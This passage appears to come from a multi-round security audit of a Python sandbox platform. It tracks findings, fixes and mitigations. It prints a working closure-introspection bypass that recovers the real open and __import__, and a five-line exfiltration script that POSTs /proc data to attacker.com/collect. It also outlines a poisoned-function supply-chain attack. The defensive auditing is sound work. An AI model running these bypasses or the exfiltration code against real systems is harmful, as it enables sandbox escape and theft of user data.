| Priority | Finding | Status | Action |
|----------|---------|--------|--------|
| **CRITICAL** | `__call__` closure bypass (F-37) | NEW R11 | `type(builtins.open).__dict__['__call__'].__closure__[0].cell_contents`. **Third iteration of same fundamental problem.** |
| **CRITICAL** | Data exfiltration chain (F-33) | CONFIRMED R11 | F-37 + F-16 = exfil without shell. Mitigate by reducing readable data (bind-mount empties). |
| **ACCEPTED** | Outbound internet (F-16) | BY DESIGN | Paid tiers require outbound for API calls. Mitigate via egress monitoring + account approval. |
| **CRITICAL** | object.__getattribute__ bypass (F-28) | Evolved → F-37 | Superseded by `__call__` closure bypass. Fundamental Python limitation. |
| **CRITICAL** | Stored XSS via registration name (F-01) | UNTESTED R7-10 | Sanitize input server-side; add CSP header |
| ~~HIGH~~ | ~~__import__ _f regression (F-35)~~ | **FIXED R11** | `_f` slot removed, but superseded by F-37 (`__call__` closure) |
| **HIGH** | Namespace name squatting (F-06) | OPEN | Add reserved name list |
| **MEDIUM** | ~~execute.pyc decompilable (F-36)~~ | MITIGATED R11 | Wrapper now self-deletes (`/sandbox/.e`), but code objects remain in memory via `__globals__` |
| **MEDIUM** | _posixsubprocess .so not hollowed (F-32) | R9 | Bind-mount `.empty` over the .so file (defense-in-depth; execve blocked by seccomp) |
| ~~CRITICAL~~ | ~~posix.system unblocked (F-29)~~ | **FIXED R9** | posix.system/execv/popen/fork all blocked by `_harden_sandbox()` |
| ~~CRITICAL~~ | ~~Real subprocess recoverable (F-30)~~ | **FIXED R9** | `_GuardedImport` class (no closure); `_posixsubprocess` poisoned |
| ~~MEDIUM~~ | ~~gc.get_objects recovery (F-31)~~ | **FIXED R9** | `gc.get_objects/get_referrers/get_referents` replaced with `_blocked` |
| ~~CRITICAL~~ | ~~_ctypes .so on disk (F-25)~~ | **FIXED R8** | .so files bind-mounted to 0-byte empty files + importlib restricted |
| ~~HIGH~~ | ~~`_f` direct attribute access (F-26)~~ | **FIXED R8** | `__getattribute__` override blocks `._f` (but bypassed by F-28) |
| ~~MEDIUM~~ | ~~_getframe breaks stdlib (F-27)~~ | **FIXED R8** | Stdlib paths allowed via `_STDLIB_PREFIXES` check |
| ~~HIGH~~ | ~~Unauthenticated admin panel (F-05)~~ | **FIXED R7** | Admin panel returns 404 |
| ~~HIGH~~ | ~~CORS misconfiguration (F-07)~~ | **FIXED R7** | Evil origins get 400; proper origin validation |
| ~~MEDIUM~~ | ~~Missing login rate limiting (F-10)~~ | **FIXED R7** | 429 after ~4 failed attempts |
| ~~MEDIUM~~ | ~~Open registration from sandbox (F-09)~~ | **FIXED R7** | Self-IP blocked by firewall |
| ~~HIGH~~ | ~~Exec token leaked (F-03)~~ | **FIXED R5** | Token removed from globals |
| ~~HIGH~~ | ~~Billing monkey-patchable (F-04)~~ | **FIXED R6** | Billing read from file by trusted code |

### Critical Attack Chains

**~~Chain 1 — XSS to Platform Takeover:~~** *(SIGNIFICANTLY MITIGATED R7)*
1. ~~Sandbox code registers account with XSS payload in name (F-09, F-01)~~ — F-09 fixed (self-IP blocked)
2. Admin views pending approvals → XSS fires (F-01) — **admin panel removed (F-05 fixed)**
3. ~~XSS knows full admin API from unauthenticated admin panel (F-05)~~ — **404 now**
4. ~~CORS allows cross-origin credential use (F-07)~~ — **origin validated now**
5. Chain broken at steps 1, 3, and 4. XSS still needs server-side sanitization but attack chain is no longer viable.

**~~Chain 2 — Port Hijacking for Credential Theft:~~** *(MITIGATED — listen() now blocked by seccomp)*

**~~Chain 3 — Data Exfiltration + Shell (R8):~~** *(SHELL BLOCKED R9 — posix.system fixed + execve blocked by seccomp)*

**Chain 3 — Data Exfiltration WITHOUT Shell (UPDATED — Round 11):**
```python
# ENTIRE ATTACK — 5 lines, pure Python, no shell needed:
import builtins, urllib.request, json
real_open = type(builtins.open).__dict__['__call__'].__closure__[0].cell_contents  # F-37
with real_open('/proc/net/tcp') as f: tcp = f.read()
with real_open('/proc/self/mountinfo') as f: mounts = f.read()  # 26 KB
payload = json.dumps({"tcp": tcp, "mounts_bytes": len(mounts)}).encode()
urllib.request.urlopen(urllib.request.Request('https://attacker.com/collect',
    data=payload, headers={'Content-Type': 'application/json'}))
```
No shell, no subprocess, no ctypes. Three iterations of hiding the real `open` — all bypassed.

**Chain 4 — Supply Chain Attack via Function Poisoning (UPDATED — Round 9):**
1. Malicious function code published to namespace
2. When called by another user's MCP client, the code:
   a. ~~`import posix; posix.system('...')`~~ — **blocked R9**
   b. Reads user input data via `object.__getattribute__(open, '_f')` (F-28) — **still works**
   c. Exfiltrates via `urllib.request` to attacker server (F-16) — **still works**
   d. Returns plausible-looking results to avoid detection

### Overall Assessment

**Rounds 10-11 demonstrate the futility of Python-level function hiding.** Three different hiding strategies have been tried across R8-R11 — all bypassed:

| Round | Hiding Strategy | Bypass |
|-------|----------------|--------|
| R8-R9 | `__slots__ = ('_f',)` + `__getattribute__` override | `object.__getattribute__(instance, '_f')` (F-28) |
| R10 | Closure-based function wrappers | `func.__closure__[0].cell_contents` (F-34) |
| R11 | Empty `__slots__`, real fn in `__call__` method closure | `type(obj).__dict__['__call__'].__closure__[N]` (F-37) |

**R11 changes:**
- `__slots__ = ()` (empty) — blocks F-28 (`_f` access) ✓
- No instance closure — blocks F-34 (direct closure access) ✓
- Real function moved to `__call__` method closure — **bypassed via F-37** ✗
- Wrapper moved to `/sandbox/.e` (self-deleting) — code still in memory via `__globals__`
- `/opt/mcpworks/bin/` removed — but function objects retain all code info
- Class names shortened (`_R`, `_G`) — cosmetic obfuscation only

**R11 fixes (2 R10 regressions resolved):**
- F-34 (closure-based open): blocked — wrappers are class instances now, not closures
- F-35 (__import__ _f): blocked — `_f` slot removed

**R11 new findings (1):**

| Finding | Severity | Description |
|---------|----------|-------------|
| F-37: `__call__` closure bypass | Critical | `type(obj).__dict__['__call__'].__closure__[N].cell_contents` — recovers all real functions AND config data (poisoned modules, stdlib prefixes, allowed signals) |

**Current security posture:**

| Layer | Status | Notes |
|-------|--------|-------|
| nsjail process isolation | Strong | User/mount/PID/IPC/UTS namespaces isolated |
| seccomp syscall filter | **Strong** | `execve` blocked — no binary execution possible |
| Network isolation | **Weak** | Shared network namespace, full outbound internet access |
| Python-level hardening | **Ineffective** | 3 iterations of function hiding all bypassed (F-28→F-34→F-37) |
| File access control | **None effective** | All `_is_blocked_path` checks bypassed via F-37 |

**Attack surface (R10 → R11):**
- Shell access: **0 paths** (unchanged — seccomp blocks execve)
- File read bypass: `type(builtins.open).__dict__['__call__'].__closure__[0].cell_contents` (F-37)
- Import bypass: `type(__import__).__dict__['__call__'].__closure__[1].cell_contents` (F-37)
- Config leak: Poisoned modules list, stdlib prefixes, allowed signals — all in closures (F-37)
- Exfil chain: **Still fully working** (F-37 + F-16)
- Reverse shell: **Still impossible** (execve blocked)

**Remaining critical issues (4):**
1. **`__call__` closure bypass (F-37)** — third iteration of unfixable Python introspection. Recovers all wrapped functions.
2. **Outbound internet (F-16)** — **by design** for paid tiers (builder/pro/enterprise need to call external APIs). Cannot be blocked. This means the exfiltration chain is an accepted risk for paid accounts, mitigated by account approval and monitoring.
3. **Data exfiltration chain (F-33)** — F-37 + F-16 = read any file and POST to internet. Confirmed R11. Inherent to any platform that grants both file access and outbound networking.
4. **Stored XSS (F-01)** — untested R7-11, attack chain mostly broken.

**Recommended next steps:**

> **Constraint:** Outbound internet is a product requirement for paid tiers. F-16 cannot be "fixed" — it is intentional. Mitigations must focus on reducing what can be *read* (information leakage), not what can be *sent* (egress).

1. **Stop iterating on Python-level function hiding** — 3 attempts, 3 bypasses. CPython closures, `__slots__`, and method descriptors are ALL introspectable. This approach cannot work.
2. **Bind-mount empty files over sensitive /proc entries** — `/proc/net/tcp`, `/proc/net/arp`, `/proc/net/route`, `/proc/self/mountinfo`, `/proc/self/maps`, `/proc/self/status`, `/proc/self/cgroup`. Same technique used for `/proc/cpuinfo`/`meminfo`/`version`. This is **unforgeable** regardless of Python-level bypass.
3. **`clone_newnet:true` with veth + NAT** — each sandbox gets its own network namespace with outbound internet (via veth pair + masquerade). Eliminates `/proc/net/*` host leakage, port hijacking risk, and ARP/MAC exposure. Outbound HTTP still works for legitimate use.
4. **Hollow _posixsubprocess .so** (F-32) — bind-mount `.empty` over it, same as _ctypes. Defense-in-depth.
5. **Stored XSS fix** (F-01) — server-side HTML sanitization on registration name field.
6. **Egress monitoring** — since outbound can't be blocked, consider logging outbound connection metadata (destination, size, timing) for anomaly detection. Alert on large POST bodies to unknown domains.
7. **Accept `_harden_sandbox()` as defense-in-depth only** — keep it for casual deterrence but do not invest further in Python-level hiding. The security boundary is nsjail + seccomp + filesystem controls.

**Fixed across all rounds:** 17 findings (F-02, F-03, F-04, F-05, F-07, F-09, F-10, F-25, F-26, F-27, F-29, F-30, F-31, F-34, F-35, internal firewall, /proc fake entries)
**Persistently bypassed (3 iterations):** File access (F-08→F-28→F-34→F-37), Frame traversal (F-17), Signal override (F-19), sys.modules (F-20)
**Fixed at seccomp level:** F-18 (subprocess/shell — execve blocked)
**Still open:** 5 findings (F-01 XSS, F-06 namespace squatting, F-16 outbound, F-33 exfil chain, F-37 `__call__` closure)

### Test Account Cleanup

The following accounts were created during testing and should be removed:
- `security-audit@test.com` (ID: `1f077373-...`)
- `security-audit-r3@test.com` (ID: `63aef5f8-...`)
- `xss-test@test.com` (ID: `58f2b407-...`)
- `jwt-probe-*@test.com` (created in Round 4)
- `r4-*@test.com` (created in Round 4, registration rate-limited)

Round 7: No new test accounts were created (registration rate-limited from earlier tests).
Round 9: No new test accounts or namespaces created. XSS registration test timed out (sandbox→API egress blocked).
Round 10: No new test accounts or namespaces created. Testing focused on bypass regression analysis.
Round 11: No new test accounts or namespaces created. Testing focused on `__call__` closure bypass (F-37).

All namespaces created during testing (`audit-test`, `audit-unverified`, `admin`, `api`, `www`, `internal`, `r4-test`) were deleted during the audit. They remain recoverable for 30 days.
